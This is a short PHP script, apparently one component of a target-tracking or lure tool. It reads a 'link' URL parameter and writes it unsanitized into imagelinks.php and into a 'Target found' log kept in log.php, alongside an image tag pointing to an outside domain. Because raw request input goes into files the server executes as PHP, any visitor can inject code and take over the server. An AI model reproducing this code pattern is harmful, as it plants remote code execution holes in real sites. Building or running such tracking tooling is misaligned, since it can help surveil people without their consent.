
<?php

date_default_timezone_set('Asia/Kolkata');
$date = date('Y/m/d H:i:s');

$var=$_GET["link"];
$txtdisp = ' <img src="https://csfrs.eu.org/found/temp.png" width="400" height="300"> ';

$fp = fopen('imagelinks.php', 'w');
fwrite($fp, $var);
fwrite($fp, "\n");
fwrite($fp, $txtdisp);
fclose($fp);
$fp = fopen('log.php', 'a');
fwrite($fp, $date);
fwrite($fp, '--Target found,  ');
fwrite($fp, $var);
fwrite($fp, "\n\n\n");
fclose($fp);
$fp = fopen('trigger.txt', 'w');
fwrite($fp, "0");
fclose($fp);
$fp = fopen('status2.txt', 'w');
fwrite($fp, "0");
fclose($fp);
?>
